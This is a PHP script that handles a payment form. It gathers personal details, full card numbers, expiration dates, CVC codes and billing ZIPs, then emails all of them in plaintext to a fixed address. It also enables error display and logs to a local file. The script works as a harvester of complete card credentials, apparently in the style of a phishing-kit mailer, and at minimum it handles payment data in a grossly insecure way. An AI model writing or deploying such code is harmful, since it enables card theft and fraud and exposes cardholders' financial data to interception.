<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

function logError($message) {
    $logFile = 'mail_errors.log';
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($logFile, "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
}

if(isset($_GET['action']) && $_GET['action'] === 'payment_info') {
    $required_fields = ['firstName', 'lastName', 'email', 'phone', 'businessName', 'cardNumber', 'expirationDate', 'cvc', 'cardholderName', 'billingZip'];
    foreach ($required_fields as $field) {
        if (!isset($_POST[$field]) || empty($_POST[$field])) {
            echo "error: Missing field $field";
            logError("Missing field: $field");
            exit;
        }
    }
    
    $firstName = htmlspecialchars($_POST['firstName']);
    $lastName = htmlspecialchars($_POST['lastName']);
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $phone = htmlspecialchars($_POST['phone']);
    $businessName = htmlspecialchars($_POST['businessName']);
    $cardNumber = htmlspecialchars($_POST['cardNumber']);
    $expirationDate = htmlspecialchars($_POST['expirationDate']);
    $cvc = htmlspecialchars($_POST['cvc']);
    $cardholderName = htmlspecialchars($_POST['cardholderName']);
    $billingZip = htmlspecialchars($_POST['billingZip']);
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo "error: Invalid email format";
        logError("Invalid email format: $email");
        exit;
    }
    
    $to_email = "daniel@need-ads.com";
    $from_email = "no-reply@need-ads.com";
    $subject = "New Payment Information Submission";
    
    $message = "
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; }
            .info { margin-bottom: 10px; }
            strong { color: #333; }
        </style>
    </head>
    <body>
        <h2>New Payment Information Submission</h2>
        <div class='info'><strong>First Name:</strong> $firstName</div>
        <div class='info'><strong>Last Name:</strong> $lastName</div>
        <div class='info'><strong>Email:</strong> $email</div>
        <div class='info'><strong>Phone:</strong> $phone</div>
        <div class='info'><strong>Business Name:</strong> $businessName</div>
        <div class='info'><strong>Card Number:</strong> $cardNumber</div>
        <div class='info'><strong>Expiration Date:</strong> $expirationDate</div>
        <div class='info'><strong>CVC:</strong> $cvc</div>
        <div class='info'><strong>Cardholder Name:</strong> $cardholderName</div>
        <div class='info'><strong>Billing ZIP/Postal Code:</strong> $billingZip</div>
    </body>
    </html>
    ";

    $headers = "From: $from_email\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    
    if (mail($to_email, $subject, $message, $headers)) {
        logError("Email sent successfully to: $to_email");
        echo "success";
    } else {
        logError("Email could not be sent.");
        echo "error: Email could not be sent. Please try again later.";
    }
} else {
    logError("Invalid request: action parameter missing or incorrect");
    echo "error: Invalid request";
}
?>
